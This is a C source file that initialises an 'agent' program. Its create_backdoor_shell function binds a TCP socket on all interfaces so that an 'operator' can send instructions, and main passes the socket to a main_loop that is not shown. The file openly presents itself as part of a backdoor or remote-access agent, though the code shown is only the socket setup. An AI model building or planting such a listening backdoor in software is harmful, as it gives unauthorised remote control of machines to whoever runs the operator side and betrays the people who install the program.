/**
 * @file init.c
 * @brief Initializes agent app and passess context to main loop.
 */

#include <xsocket/protocol.h>
#include <xsocket/xsocket.h>

#include "app.h"

/*
 * @brief Makes port reusable instantly after program finishes.
 * @param sock Socket to modify.
 *
 * This is because after agent ends, it may not work instantly after restarting
 * it which is annoying while testing.
 */
static inline int reuse_addr(Socket sock) {
  int reuse = 1;
  return setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (const char *)&reuse,
                    (SocketLen)sizeof reuse);
}

/**
 * @brief Create socket that listens for instructions from operator.
 * @return Listening socket with shell or INVALID_SOCKET on failure.
 */
static inline Socket create_backdoor_shell() {
  Socket sock = INVALID_SOCKET;

  do {
    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (!xsocket_valid(sock)) {
      return INVALID_SOCKET;
    }

    if (reuse_addr(sock) == SOCKET_ERROR) {
      break;
    }

    struct sockaddr_in address = {};
    address.sin_family = AF_INET;
    address.sin_port = htons(XSOCKET_PORT);
    address.sin_addr.s_addr = htonl(INADDR_ANY);

    if (bind(sock, (struct sockaddr *)&address, sizeof address) < 0) {
      break;
    }

    if (listen(sock, 1) < 0) {
      break;
    }

    return sock;
  } while (false);

  if (xsocket_valid(sock)) {
    close_socket(sock);
  }
  return INVALID_SOCKET;
}

/**
 * @brief App entry point.
 * @return App exit code.
 */
int main(void) {
  int rc = 0;
  Socket shell = INVALID_SOCKET;
  bool xsocket_ok = false;

  do {
    if (!xsocket_init()) {
      rc = 1;
      break;
    }
    xsocket_ok = true;

    shell = create_backdoor_shell();
    if (!xsocket_valid(shell)) {
      rc = 1;
      break;
    }

    rc = main_loop(shell);
  } while (false);

  if (xsocket_valid(shell)) {
    close_socket(shell);
  }

  if (xsocket_ok) {
    xsocket_cleanup();
  }

  return rc;
}
